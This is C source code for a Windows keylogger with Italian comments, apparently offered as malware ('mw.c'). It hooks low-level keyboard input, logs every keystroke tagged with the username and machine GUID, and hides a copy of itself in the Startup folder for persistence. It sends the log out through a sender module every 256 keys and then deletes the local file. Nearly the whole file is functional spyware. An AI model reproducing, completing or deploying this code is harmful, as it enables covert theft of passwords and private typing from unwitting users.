#include <stdio.h>
#include <windows.h>
#include <shlobj.h>
#include <string.h>

#include "sender.h"

char Filename[0x104];
char UserName[0x104];
char mguid[0x104];
char logfilename[0x104];
FILE *logFile = NULL;
char initString[0x208];

int contKeys = 0;

HHOOK hookTastiera;
char bufferText[256];

int saveCharOnFile(char c){
    if (logFile == NULL) {
        logFile = fopen(logfilename, "a");
        fprintf(logFile, "%s", initString);
        contKeys = 0;
    }
    if (logFile) {
        fputc(c, logFile);
        fflush(logFile);
    }
}

char getCharFromKey(KBDLLHOOKSTRUCT *key){
    WORD keyChar = 0;
    BYTE keyboardstate[256];
    GetKeyboardState(keyboardstate);
    keyboardstate[VK_SHIFT] = GetKeyState(VK_SHIFT);
    keyboardstate[VK_CONTROL] = GetKeyState(VK_LCONTROL);
    keyboardstate[VK_CAPITAL] = GetKeyState(VK_CAPITAL);
    keyboardstate[VK_MENU] = GetKeyState(VK_MENU);

    int ret = ToAscii( // TODO manca inerire lo SHIFT e gli altri
        key->vkCode, key->scanCode, keyboardstate, &keyChar, 0);
    
    if (ret != 1){
        return 0;
    }
    return (char)keyChar;
}

LRESULT CALLBACK KeyPressed(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0) {
        if (wParam == WM_KEYDOWN) { // a key has been pressed
            KBDLLHOOKSTRUCT *key = (KBDLLHOOKSTRUCT *)lParam;

            char c = getCharFromKey(key);
            printf("Tasto tradotto: %c\n", c);
            
            if (c){
                saveCharOnFile(c);
                contKeys++;

                if (contKeys >= 256){
                    if (logFile) {
                        fclose(logFile);
                        logFile = NULL;
                    }
                    if (sendTextFromFile(logfilename) == 0){
                        remove(logfilename);
                    }
                }
            }
        }
    }
    return CallNextHookEx(hookTastiera, nCode, wParam, lParam);
}

//vibecoded
void checkPrevoiusLogs(){
    // 1. Prova ad aprire il file in modalità lettura binaria
    FILE *file = fopen(logfilename, "rb");
    
    // Se file è NULL, significa che non esiste (o non abbiamo i permessi). Esce silenziosamente.
    if (file == NULL) {
        return; 
    }

    // 2. Calcola quanto è grande il file (per capire se è vuoto)
    fseek(file, 0, SEEK_END); // Sposta il cursore alla fine del file
    long size = ftell(file);  // Legge la posizione (ovvero i byte totali)
    rewind(file);             // Riporta il cursore all'inizio per poterlo leggere

    // 3. Se non è vuoto, leggiamo e inviamo
    if (size > 0) {
        // Alloco la memoria necessaria in base alla grandezza esatta del file (+1 per il terminatore)
        char *buffer = (char *)malloc(size + 1);
        
        if (buffer != NULL) {
            // Leggo tutto il contenuto dentro il buffer
            fread(buffer, 1, size, file);
            buffer[size] = '\0'; // Chiudo la stringa per evitare caratteri "spazzatura" alla fine

            // 4. Chiamo la tua funzione per inviare il testo
            sendText(buffer);

            // Libero la memoria per evitare memory leak
            free(buffer);
        } else {
            printf("Errore: memoria insufficiente per leggere il file.\n");
        }
    }
    fclose(file);
    if (remove(logfilename) == 0) {
        printf("Il file '%s' e' stato letto, inviato e cancellato con successo.\n", logfilename);
    } else {
        printf("Errore: impossibile cancellare il file '%s'.\n", logfilename);
    }
}

void payload(){
    checkPrevoiusLogs();
    hookTastiera = SetWindowsHookEx(WH_KEYBOARD_LL, KeyPressed, GetModuleHandle(NULL), 0);
    
    if (hookTastiera == NULL) {
        return;
    }

    MSG msg;
    // freeze the program until a new key is pressed
    while (GetMessage(&msg, NULL, 0, 0)){}
    UnhookWindowsHookEx(hookTastiera);

    return;
}

void createcopy(){
    char newPath[0x104];
    SHGetFolderPathA(NULL, 7, NULL, 0, newPath);
    
    char newname[100] = "\\baalclone.exe";
    strcat(newPath, newname);

    int ret = CopyFileA(Filename, newPath, 0);
    if (ret){
        // per mostrare: attrib -h -s -r baalclone.exe
        SetFileAttributesA(newPath, 0x7u);
    }
    return;
}

int checkcopy(){
    char *ret = strstr(Filename, "clone");
    if (ret == NULL)
        return 0;
    return 1;
}

void gatherInfo(){
    GetModuleFileNameA(0, Filename, 0x104);
    
    DWORD pcbBuffer = 0x104;
    GetUserNameA(UserName, &pcbBuffer);

    HKEY hKey;
    const char* subKey = "SOFTWARE\\Microsoft\\Cryptography";
    const char* valueName = "MachineGuid";
    DWORD dataSize = sizeof(mguid);
    DWORD dataType;
    LONG openStatus = RegOpenKeyExA(HKEY_LOCAL_MACHINE, subKey, 0, KEY_QUERY_VALUE | 0x0100, &hKey);

    if (openStatus == ERROR_SUCCESS) {
        LONG readStatus = RegQueryValueExA(hKey, valueName, NULL, &dataType, (LPBYTE)mguid, &dataSize);
        
        if (readStatus != ERROR_SUCCESS) {
            strcpy(mguid,"mguidUnknow\0");
        }
        RegCloseKey(hKey);
    } else {
        strcpy(mguid,"mguidUnknow\0");
    }

    strcpy(logfilename,"C:\\Users\\");
    strcat(logfilename, UserName);
    strcat(logfilename,"\\AppData\\Roaming\\offline_log.txt");

    strcpy(initString, UserName);
    strcat(initString, "_");
    strcat(initString, mguid);
    strcat(initString, ": ");
    return;
}

int main(){
    gatherInfo();
    if (!checkcopy())
        createcopy();
    payload();
    //TODO client invia sempre la coppia nume utente macchine prima del testi
    // il server crea un txt nuovo per ogni utente
    return 0;
    
    // gcc.exe mw.c sender.h -o mw.exe -lwininet
}
